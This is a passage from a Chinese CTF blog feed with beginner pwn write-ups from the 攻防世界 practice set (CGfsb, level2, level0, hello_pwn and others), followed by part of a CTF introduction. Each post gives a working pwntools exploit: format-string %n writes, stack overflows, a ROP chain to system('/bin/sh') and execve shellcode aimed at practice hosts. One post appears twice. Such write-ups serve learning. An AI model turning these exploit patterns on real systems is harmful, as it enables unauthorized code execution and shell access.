class="built_in">print</span> addr</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;What should your character&#x27;s name be:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;So, where you will go?east or up?:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;east&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;go into there(1), or leave(0)?:\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;&#x27;Give me an address&#x27;\n&quot;</span>)</span><br><span class="line">r.sendline(<span class="built_in">str</span>(addr))</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;And, you wish is:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">85</span> + <span class="string">&quot;%7$n&quot;</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#shellcode = asm(shellcraft.sh())</span></span><br><span class="line"><span class="comment"># https://www.exploit-db.com/</span></span><br><span class="line"><span class="comment"># http://shell-storm.org/shellcode/</span></span><br><span class="line"><span class="comment"># 两个寻找shellcode的网址</span></span><br><span class="line">shellcode = <span class="string">&quot;\x6a\x3b\x58\x99\x52\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05&quot;</span></span><br><span class="line">r.sendline(shellcode)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>over</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn新手练习（CGfsb）</title>
      <link href="2020/03/04/CTF/cgpwn2/"/>
      <url>2020/03/04/CTF/cgpwn2/</url>
      
        <content type="html"><![CDATA[<h1 id="攻防世界pwn新手练习（CGfsb）"><a href="#攻防世界pwn新手练习（CGfsb）" class="headerlink" title="攻防世界pwn新手练习（CGfsb）"></a>攻防世界pwn新手练习（CGfsb）</h1><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>ok，按照惯例，拿到程序后先扔到Linux下查一下基本信息</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190915175801864.png" alt="在这里插入图片描述"></p><p>32位程序，开了NX(堆栈不可执行)以及CANNARY(栈保护)<br>貌似有一丝丝头疼嗷，咱们运行一下，看看它的程序逻辑</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190915180331274.png" alt="在这里插入图片描述"></p><p>唔，是一个留言板，可以输入的地方有两处，一处是名字，一处是留言内容。ok，可以扔进IDA分析了。<br>F5后直接看程序伪代码</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190915180733310.png" alt="在这里插入图片描述"></p><p>很明显，我们需要让<strong>pwnme</strong>这个变量的值等于8，然后便可以拿到flag文件中的东西，这个时候<br>我们需要注意到它的上面有一行代码</p><pre><code>    printf（&amp;s）;</code></pre><p>不知道有没有同学感觉很别扭，我们学c语言时老师一般教给我们的是这样的：</p><pre><code>    printf(&quot;%s&quot;, s);</code></pre><p>哎，他这个和老师教的不一样哎，这样可以吗？<br>答案是可以的，这样写是可以运行的，但同时这样写也是不允许的，为什么呢，因为这是不安全的，他涉及到格式化字符串漏洞：<br>一般的<strong>printf</strong>是这个样子的</p><pre><code>    printf（&quot;格式化字符串&quot;,参数...)</code></pre><p>它的参数是由格式化说明符与字符串组成的，通过格式化说明符来规定参数用什么格式输出内容。<br>格式化说明符有这些：</p><pre><code>%d - 十进制 - 输出十进制整数%s - 字符串 - 从内存中读取字符串%x - 十六进制 - 输出十六进制数%c - 字符 - 输出字符%p - 指针 - 指针地址%n - 到目前为止所写的字符数</code></pre><p>我们需要注意的是<kbd><strong>%n</strong></kbd>这个格式化字符串，它的功能是将%n之前打印出来的字符个数，赋值给一个变量，例如这样：</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190915183504389.png" alt="在这里插入图片描述"></p><p>一个很神奇的结果出现在我们眼前，变量<strong>a</strong>的值被改变了。<br>由此，我们想到是否我们可以改变上面程序中的<strong>pwnme</strong>的值，答案时肯定的，利用判断pwnme的值的上一行的代码，我们完全可以做到这一点。<br>所以说，现在我们要做的有这么几点：<br>1、我们需要将pwnme的地址输入到s（也就是message）中去<br>2、在合适的位置上加一个<code>%n</code>，使其与我们输入的地址对应从而造成漏洞利用<br>所以接下来的问题变成了如何让他们对应起来</p><p>首先，我们得查一下我们输入进去的数据在栈中偏移了多少，知道偏移量后我们才能将其对应起来。</p><p>继续运行一遍程序，我们在massage处输入：</p><pre><code>AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</code></pre><p>因为下面有个printf（%s），所以我们输入的内容自然会在下面被显示出来。我们看一下结果：</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190915195454114.png" alt="在这里插入图片描述"></p><p>0x41414141便是我们输入的”AAAA”，数一下便知道偏移是10</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>好了，有了以上东西我们就可以着手开始写exp了<br>具体exp如下：</p><pre><code>from pwn import *#r = precess(&quot;./CGfsb&quot;)r = remote(&#39;111.198.29.45&#39;, 46635)pwnme_addr = 0x0804A068           #pwnme地址在伪代码中双击就能查看哦payload = p32(pwnme_addr) + &#39;aaaa&#39; + &#39;%10$n&#39;     #pwnme的地址需要经过32位编码转换，是四位，而pwnme需要等于8，所以‘aaaa’起着凑字数的作用r.recvuntil(&quot;please tell me your name:\n&quot;)r.sendline(&#39;BurYiA&#39;)r.recvuntil(&quot;leave your message please:\n&quot;)r.sendline(payload)r.interactive()</code></pre><p>代码效果如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190915200816352.png" alt="在这里插入图片描述"></p><p>ok完成</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn新手练习（level2）</title>
      <link href="2020/03/03/CTF/level2/"/>
      <url>2020/03/03/CTF/level2/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191221232239768.png" alt="在这里插入图片描述"></p><p>可以看到题上已经有提示了（ROP）<br>我们看一下程序的保护状态和它的运行情况</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191221232422603.png" alt="在这里插入图片描述"></p><p>开了NX，问题不大。运行可以发现有一个<strong>输入点</strong><br>放IDA里看看</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191224090219100.png" alt="在这里插入图片描述"></p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191224090306975.png" alt="在这里插入图片描述"></p><p>在字符串窗口可以发现有**/bin/sh<strong>，并且左边的函数窗口可以看到在 **.plt</strong> 段有<strong>system</strong> 函数<br>这就很舒服了呀，再结合一下题目给的提示，构造ROP链就行，效果如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191224090834726.png" alt="在这里插入图片描述"></p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>具体EXP如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;111.198.29.45&quot;</span>, <span class="number">49673</span>)</span><br><span class="line"></span><br><span class="line">bin_sh = <span class="number">0x0804A024</span></span><br><span class="line">system = <span class="number">0x08048320</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Input:\n&quot;</span>)</span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span>*(<span class="number">0x88</span>) + <span class="string">&#x27;a&#x27;</span> * <span class="number">4</span> + p32(system) + p32(<span class="number">0</span>) + p32(bin_sh)</span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>写payload的时候要注意一个问题：</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191224091225575.png" alt="在这里插入图片描述"></p><p>所以在函数地址后面首先要去覆盖它的返回地址<br>over</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn新手练习（level0）</title>
      <link href="2020/03/02/CTF/level0/"/>
      <url>2020/03/02/CTF/level0/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>老规矩哦，我们先<strong>checksec</strong>一下，收集一下信息</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191024202258579.png" alt="在这里插入图片描述"></p><p>64位程序，开了NX，没啥说的，还在接受范围内，运行一下试试</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019102420241030.png" alt="在这里插入图片描述"></p><p>唔，没啥东西，继续IDA吧。（╯‵□′）╯︵┴─┴</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191024202723525.png" alt="在这里插入图片描述"></p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191024204246418.png" alt="在这里插入图片描述"></p><p>emmm，主函数倒是挺简单的，就一行打印，一行输入</p><p>但…不知你们有米有发现有个很奇怪的函数名，我们悄悄的瞅一瞅</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191024202902852.png" alt="在这里插入图片描述"></p><p>果然不对劲，首先它的名字中有个<strong>system</strong>（手动加粗），这个是什么东西嘞，简单的来说，它拥有系统的最高权限，啥都能干，而它和<strong>“/bin/sh”</strong>连在一起则可以给我提供一个类似cmd的东西，我们可以用它来进行查看/修改/操作等动作。<br>那么总结一下，现在我们已经有了一个可以获取系统权限的函数，利用它我们可以手动去查找flag<br>那么问题来了，我们应该如何让程序去执行这个函数呢？</p><p>重点来了（敲黑板！！！）</p><p>我们观察一下<strong>read函数</strong>读取时读取了多少东西（字符？字节？以后填坑）</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191024204944300.png" alt="在这里插入图片描述"></p><p>发现了么？发现了么？发现了么？（重要的事情说三遍）<br><strong>buf</strong>这个字符数组的长度只有0x80，而我们可以输入0x200的东西，哇，是不是很刺激，我们的输入不但可以填充满真个数组还能覆盖掉数组外面的东西，那这样又能干什么呢？<br>我们先看一下数组后面紧跟的是什么东西，继续在栈中看</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191024205343619.png" alt="在这里插入图片描述"></p><p>当属于数组的空间结束后（到0x0000000000000000时），首先，有一个<strong>s</strong>，8个字节长度，其次是一个<strong>r</strong>，重点就在这，r中存放着的就是返回地址。即当<strong>read函数</strong>结束后，程序下一步要到的地方。</p><p>那这样岂不是很美滋滋？我们可以输入好长好长的数据，完全可以覆盖这个<strong>r</strong>。ok了，分析完毕，上exp</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;111.198.29.45&quot;</span>, <span class="number">34012</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">0x80</span> + <span class="string">&#x27;a&#x27;</span> * <span class="number">0x8</span> + p64(<span class="number">0x00400596</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;Hello, World\n&quot;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure><p>瞅瞅结果？</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019102421050156.png" alt="在这里插入图片描述"></p><p>搞完收工，我们下次见，挥挥</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn新手练习（hello_pwn）</title>
      <link href="2020/02/29/CTF/hello-pwn/"/>
      <url>2020/02/29/CTF/hello-pwn/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>拿到程序后，我们首先<code>checksec</code>一下</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019091718520888.png" alt="在这里插入图片描述"></p><p>可以看到是64位程序，好的是这次只开了NX(堆栈不可执行)，ok，我们跑一下程序看看</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190917185525684.png" alt="在这里插入图片描述"></p><p>可以看到它是一个输入，然后就啥都没有了emmmm….好吧，咱们继续放到IDA里面看看</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191024200056738.png" alt="在这里插入图片描述"></p><p>通过观察我们可以发现当<strong>dword_60106C</strong>这个变量的值为<strong>1853186401</strong>时，程序会进入一个函数中，而这个函数的作用则是抓取flag。</p><p>好了，很明显了，接下来的问题时我们如何去改变这个变量的值。通过双击查看我们可以知道<strong>dword_60106C</strong>和<strong>unk_601068</strong>这俩变量都在.bss段，并且<strong>dword_60106C</strong>就在离<strong>unk_601068</strong>四个位置的地方，而凑巧的时<strong>unk_601068</strong>时可以被控制的，它是由我们输入的，而输入点给了我们10个长度的输入权限，那正好，我们可以借此覆盖掉<strong>dword_60106C</strong>使它变成我们需要的数值</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191024200816926.png" alt="在这里插入图片描述">ok了，分析结束</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&#x27;111.198.29.45&#x27;</span>, <span class="number">42136</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;A&#x27;</span> * <span class="number">4</span> + p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">r.recvuntil(<span class="string">&quot;lets get helloworld for bof\n&quot;</span>)</span><br><span class="line">r.sendline(payload)</span><br><span class="line"><span class="built_in">print</span> r.recv()</span><br></pre></td></tr></table></figure><p>我们瞅一下运行结果</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20191024201020783.png" alt="在这里插入图片描述"></p><p>ok，nice！我们下次见。</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn新手练习（when_did_you_born）</title>
      <link href="2020/02/28/CTF/when-did-you-born/"/>
      <url>2020/02/28/CTF/when-did-you-born/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>ok 多余的话就不继续累赘了昂，直接上手</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/2019091520413787.png" alt="在这里插入图片描述"></p><p>程序同上次一样开了NX(堆栈不可执行)和CANNARY(栈保护)。接下来我们首先运行一遍程序</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190916145022464.png" alt="在这里插入图片描述"></p><p>一个没什么意义的程序…注意他的输入的有两处<br>ok，接下来我们用IDA直接看代码</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190916145244617.png" alt="在这里插入图片描述"></p><p>很明显的可以看到当输入的年份为<strong>1926</strong>时可以得到<strong>flag</strong>。但是有个问题，在年份输入后它会有个判断当年份为1926时会报错并跳出…<br>emmm。。。。。。这怎么搞</p><p>全文看一下我们可以发现除了存放年份的<strong>v5</strong>变量以外，他还有一个v4和v6，那么他们是否有什么关联呢，我们双击点进去看一下</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190916150509139.png" alt="在这里插入图片描述"></p><p>ok，似不似很有意思？这意味着什么呢？这意味着我们可以用v4（Name）来覆盖v5（Birth）。<br>哎，发现了么，这两个东西刚好就是咱们需要输入的东西，所以这道题到这里就结束了，一个简单的变量覆盖</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>exp如下：</p><pre><code>from pwn import *r = remote(&quot;111.198.29.45&quot;, 58805)payload = &#39;a&#39; * (0x20 - 0x18) + p64(1926)r.recvuntil(&quot;What&#39;s Your Birth?\n&quot;)r.sendline(&quot;2000&quot;)r.recvuntil(&quot;What&#39;s Your Name?\n&quot;)r.sendline(payload)print r.recv()print r.recv()</code></pre><p>代码效果如下咯：</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190916151812393.png" alt="在这里插入图片描述"></p><p>ok，完成</p><h2 id="elf-文件"><a href="#elf-文件" class="headerlink" title="elf 文件"></a>elf 文件</h2><p>1.<a href="https://github.com/ss-buyi/ss-buyi.github.io/tree/master/resource/when_did_you_born">github</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn新手练习（CGfsb）</title>
      <link href="2020/02/27/CTF/cgfsb/"/>
      <url>2020/02/27/CTF/cgfsb/</url>
      
        <content type="html"><![CDATA[<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>ok，按照惯例，拿到程序后先扔到Linux下查一下基本信息</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190915175801864.png" alt="在这里插入图片描述"></p><p>32位程序，开了NX(堆栈不可执行)以及CANNARY(栈保护)<br>貌似有一丝丝头疼嗷，咱们运行一下，看看它的程序逻辑</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190915180331274.png" alt="在这里插入图片描述"></p><p>唔，是一个留言板，可以输入的地方有两处，一处是名字，一处是留言内容。ok，可以扔进IDA分析了。<br>F5后直接看程序伪代码</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190915180733310.png" alt="在这里插入图片描述"></p><p>很明显，我们需要让<strong>pwnme</strong>这个变量的值等于8，然后便可以拿到flag文件中的东西，这个时候<br>我们需要注意到它的上面有一行代码</p><pre><code>    printf（&amp;s）;</code></pre><p>不知道有没有同学感觉很别扭，我们学c语言时老师一般教给我们的是这样的：</p><pre><code>    printf(&quot;%s&quot;, s);</code></pre><p>哎，他这个和老师教的不一样哎，这样可以吗？<br>答案是可以的，这样写是可以运行的，但同时这样写也是不允许的，为什么呢，因为这是不安全的，他涉及到格式化字符串漏洞：<br>一般的<strong>printf</strong>是这个样子的</p><pre><code>    printf（&quot;格式化字符串&quot;,参数...)</code></pre><p>它的参数是由格式化说明符与字符串组成的，通过格式化说明符来规定参数用什么格式输出内容。<br>格式化说明符有这些：</p><pre><code>%d - 十进制 - 输出十进制整数%s - 字符串 - 从内存中读取字符串%x - 十六进制 - 输出十六进制数%c - 字符 - 输出字符%p - 指针 - 指针地址%n - 到目前为止所写的字符数</code></pre><p>我们需要注意的是<kbd><strong>%n</strong></kbd>这个格式化字符串，它的功能是将%n之前打印出来的字符个数，赋值给一个变量，例如这样：</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190915183504389.png" alt="在这里插入图片描述"></p><p>一个很神奇的结果出现在我们眼前，变量<strong>a</strong>的值被改变了。<br>由此，我们想到是否我们可以改变上面程序中的<strong>pwnme</strong>的值，答案时肯定的，利用判断pwnme的值的上一行的代码，我们完全可以做到这一点。<br>所以说，现在我们要做的有这么几点：<br>1、我们需要将pwnme的地址输入到s（也就是message）中去<br>2、在合适的位置上加一个<code>%n</code>，使其与我们输入的地址对应从而造成漏洞利用<br>所以接下来的问题变成了如何让他们对应起来</p><p>首先，我们得查一下我们输入进去的数据在栈中偏移了多少，知道偏移量后我们才能将其对应起来。</p><p>继续运行一遍程序，我们在massage处输入：</p><pre><code>AAAA-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</code></pre><p>因为下面有个printf（%s），所以我们输入的内容自然会在下面被显示出来。我们看一下结果：</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190915195454114.png" alt="在这里插入图片描述"></p><p>0x41414141便是我们输入的”AAAA”，数一下便知道偏移是10</p><h2 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h2><p>好了，有了以上东西我们就可以着手开始写exp了<br>具体exp如下：</p><pre><code>from pwn import *#r = precess(&quot;./CGfsb&quot;)r = remote(&#39;111.198.29.45&#39;, 46635)pwnme_addr = 0x0804A068           #pwnme地址在伪代码中双击就能查看哦payload = p32(pwnme_addr) + &#39;aaaa&#39; + &#39;%10$n&#39;     #pwnme的地址需要经过32位编码转换，是四位，而pwnme需要等于8，所以‘aaaa’起着凑字数的作用r.recvuntil(&quot;please tell me your name:\n&quot;)r.sendline(&#39;BurYiA&#39;)r.recvuntil(&quot;leave your message please:\n&quot;)r.sendline(payload)r.interactive()</code></pre><p>代码效果如下：</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190915200816352.png" alt="在这里插入图片描述"></p><p>ok完成</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>攻防世界pwn新手练习（get_shell）</title>
      <link href="2020/02/26/CTF/get-shell/"/>
      <url>2020/02/26/CTF/get-shell/</url>
      
        <content type="html"><![CDATA[<p> pwn入门题目，做题之前先说几个常用的工具（大佬总不至于跑来找这个题的wp吧   <em>手动狗头</em>）</p><h3 id="IDA-Pro"><a href="#IDA-Pro" class="headerlink" title="IDA Pro"></a>IDA Pro</h3><p>IDA是一款优秀的静态反汇编工具，好处就不多说了，什么一键F5、字符串搜索、函数位置查找等等，好用的不得了，下载可以去<a href="https://www.kanxue.com/">看雪论坛</a>找。</p><h3 id="pwntools"><a href="#pwntools" class="headerlink" title="pwntools"></a>pwntools</h3><p><a href="https://pwntools.readthedocs.io/en/stable/">pwntools官网</a>是这样说的：pwntools是一个CTF框架和开发库。它是用Python编写的，旨在快速构建原型和开发，并使利用编写尽可能简单。<br>实际上就是用来帮助写exp的python库，用这个可以快速利用漏洞达到目的</p><h3 id="peda"><a href="#peda" class="headerlink" title="peda"></a>peda</h3><p>这个就基本算不上是一个工具了，它是gdb（Linux下的动态调试工具）的插件，功能挺强大的<br>安装：</p><pre><code>      git clone https://github.com/longld/peda.git ~/peda      echo &quot;source ~/peda/peda.py&quot; &gt;&gt; ~/.gdbinit      echo &quot;DONE! debug your program with gdb and enjoy&quot;</code></pre><h3 id="正题"><a href="#正题" class="headerlink" title="正题"></a>正题</h3><p>首先下载附件拿到一个文件，直接扔到Linux中查一下（checksec在下载好pwntools后就有）</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190915172540388.png" alt="在这里插入图片描述"></p><p>从图上可以看出它是一个64位程序，开了NX防护（堆栈不可执行）。唔，好的，基本信息咱们已经知道了，然后可以试着执行一下这个程序（Linux下）：</p><p><img src= "/img/loading.gif" data-lazy-src="https://img-blog.csdnimg.cn/20190915173040327.png" alt="在这里插入图片描述"></p><p>emmm…啥玩儿，这就结束了？？？（╯‵□′）╯︵┴─┴</p><p>好吧，师傅们可以走了，后续用nc（Linux自带）连接一下就行，命令：</p><pre><code>nc   ip地址   ip端口</code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF简介</title>
      <link href="2020/02/26/CTF/what-the-ctf/"/>
      <url>2020/02/26/CTF/what-the-ctf/</url>
      
        <content type="html"><![CDATA[<h2 id="概述"><a href="#概述" class="headerlink" title="概述"></a>概述</h2><p>CTF（Capture The Flag）中文一般译作夺旗赛，在网络安全领域中指的是网络安全技术人员之间进行技术竞技的一种比赛形式。CTF起源于1996年DEFCON全球黑客大会，以代替之前黑客们通过互相发起真实攻击进行技术比拼的方式。发展至今，已经成为全球范围网络安全圈流行的竞赛形式，2013年全球举办了超过五十场国际性CTF赛事。而DEFCON作为CTF赛制的发源地，DEFCON CTF也成为了目前全球最高技术水平和影响力的CTF竞赛，类似于CTF赛场中的“世界杯”。</p><p>CTF 为团队赛，通常以三人为限，要想在比赛中取得胜利，就要求团队中每个人在各种类别的题目中至少精通一类，三人优势互补，取得团队的胜利。同时，准备和参与 CTF 比赛是一种有效将计算机科学的离散面、聚焦于计算机安全领域的方法。</p><h2 id="赛事介绍"><a href="#赛事介绍" class="headerlink" title="赛事介绍"></a>赛事介绍</h2><p>CTF是一种流行的信息安全竞赛形式，其英文名可直译为“夺得Flag”，也可意译为“夺旗赛”。其大致流程是，参赛团队之间通过进行攻防对抗、程序分析等形式，率先从主办方给出的比赛环境中得到一串具有一定格式的字符串或其他内容，并将其提交给主办方，从而夺得分数。为了方便称呼，我们把这样的内容称之为“Flag”。</p><h3 id="CTF竞赛模式"><a href="#CTF竞赛模式" class="headerlink" title="CTF竞赛模式"></a>CTF竞赛模式</h3><ul><li><p>解题模式（Jeopardy）<br>在解题模式CTF赛制中，参赛队伍可以通过互联网或者现场网络参与，这种模式的CTF竞赛与ACM编程竞赛、信息学奥赛比较类似，以解决网络安全技术挑战题目的分值和时间来排名，通常用于在线选拔赛。题目主要包含逆向、漏洞挖掘与利用、Web渗透、密码、取证、隐写、安全编程等类别。</p></li><li><p>攻防模式（Attack-Defense）<br>在攻防模式CTF赛制中，参赛队伍在网络空间互相进行攻击和防守，挖掘网络服务漏洞并攻击对手服务来得分，修补自身服务漏洞进行防御来避免丢分。攻防模式CTF赛制可以实时通过得分反映出比赛情况，最终也以得分直接分出胜负，是一种竞争激烈，具有很强观赏性和高度透明性的网络安全赛制。在这种赛制中，不仅仅是比参赛队员的智力和技术，也比体力（因为比赛一般都会持续48小时及以上），同时也比团队之间的分工配合与合作。</p></li><li><p>混合模式（Mix）<br>结合了解题模式与攻防模式的CTF赛制，比如参赛队伍通过解题可以获取一些初始分数，然后通过攻防对抗进行得分增减的零和游戏，最终以得分高低分出胜负。采用混合模式CTF赛制的典型代表如iCTF国际CTF竞赛。</p></li></ul><h3 id="题目类别"><a href="#题目类别" class="headerlink" title="题目类别"></a>题目类别</h3><ul><li><p>Reverse</p><p>  题目涉及到软件逆向、破解技术等，要求有较强的反汇编、反编译功底。主要考查参赛选手的逆向分析能力。</p><p>  所需知识：汇编语言、加密与解密、常见反编译工具</p></li><li><p>Pwn</p><p>  Pwn 在黑客俚语中代表着攻破，获取权限，在 CTF 比赛中它代表着溢出类的题目，其中常见类型溢出漏洞有整数溢出、栈溢出、堆溢出等。主要考查参赛选手对漏洞的利用能力。</p><p>  所需知识：C，OD+IDA，数据结构，操作系统</p></li><li><p>Web</p><p>  Web 是 CTF 的主要题型，题目涉及到许多常见的 Web 漏洞，如 XSS、文件包含、代码执行、上传漏洞、SQL 注入等。也有一些简单的关于网络基础知识的考察，如返回包、TCP/IP、数据包内容和构造。可以说题目环境比较接近真实环境。</p><p>  所需知识：PHP、Python、TCP/IP、SQL</p></li><li><p>Crypto</p><p>  